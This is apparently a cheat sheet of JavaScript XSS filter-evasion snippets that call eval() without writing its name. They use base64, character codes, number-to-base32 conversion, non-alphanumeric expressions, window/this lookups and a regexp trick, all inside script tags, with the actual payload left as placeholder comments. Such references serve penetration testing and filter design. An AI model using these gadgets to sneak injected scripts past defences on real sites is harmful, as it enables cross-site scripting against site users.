/***********************/
/* Encoded eval string */
/***********************/
&lt;script&gt;
var eval_b64 = &#39;ZXZhbA==&#39;;
var eval_charcode = &#39;String.fromCharCode(101,118,97,108)&#39;;
var eval_base32 = &#39;490837..toString(1&lt;&lt;5)&#39;;
var eval_non_alpha1 = &#39;(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][+[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]&#39;;
var eval_non_alpha2 = &#39;(+{}+[])[-~[]]+(![]+[])[-~-~[]]+([][+[]]+[])[-~-~-~[]]+(!![]+[])[-~[]]+(!![]+[])[+[]])&#39;;
&lt;/script&gt;

/*********************/
/* Through functions */
/*********************/
&lt;script&gt;
var fn=window[atob(&#39;ZXZhbA==&#39;)];
fn(/*code to eval()/*);
&lt;/script&gt;

&lt;script&gt;
var fn=window[String.fromCharCode(101,118,97,108)];
fn(/*code to eval()/*);
&lt;/script&gt;

&lt;script&gt;
var fn=window[490837..toString(1&lt;&lt;5)];
fn(/*code to eval()/*);
&lt;/script&gt;

/**********************************/
/* Straight through window object */
/**********************************/
&lt;script&gt;
window[atob(&#39;ZXZhbA==&#39;)](/*code to eval()*/)
&lt;/script&gt;

&lt;script&gt;
window[String.fromCharCode(101,118,97,108)](/*code to eval()*/)
&lt;/script&gt;

&lt;script&gt;
window[490837..toString(1&lt;&lt;5)](/*code to eval()*/)
&lt;/script&gt;

&lt;script&gt;
window[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][+[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]](/* code to eval() */)
&lt;/script&gt;

&lt;script&gt;
window[(+{}+[])[-~[]]+(![]+[])[-~-~[]]+([][+[]]+[])[-~-~-~[]]+(!![]+[])[-~[]]+(!![]+[])[+[]]](/* code to eval() */)
&lt;/script&gt;

/*************************/
/* Straight through this */
/*************************/
&lt;script&gt;
this[atob(&#39;ZXZhbA==&#39;)](/*code to eval()*/)
&lt;/script&gt;

&lt;script&gt;
this[String.fromCharCode(101,118,97,108)](/*code to eval()*/)
&lt;/script&gt;

&lt;script&gt;
this[490837..toString(1&lt;&lt;5)](/*code to eval()*/)
&lt;/script&gt;

&lt;script&gt;
this[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][+[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]](/* code to eval() */)
&lt;/script&gt;

&lt;script&gt;
this[(+{}+[])[-~[]]+(![]+[])[-~-~[]]+([][+[]]+[])[-~-~-~[]]+(!![]+[])[-~[]]+(!![]+[])[+[]]](/* code to eval() */)
&lt;/script&gt;

/****************/
/* regexp based */
/****************/
&lt;script&gt;
&#39;e1v2a3l&#39;.replace(/(.).(.).(.).(.)/, function(match,$1,$2,$3,$4) { this[$1+$2+$3+$4](/* code to eval() */); })
&lt;/script&gt;

/*********************************/
/* Other ways to execute strings */
/*********************************/
&lt;script&gt;
delete /* code to execute */
throw~delete~typeof~/* code to execute */
delete[a=/* function */]/delete a(/* params */)
var a = (new function(/* code to execute */))();
&lt;/script&gt;

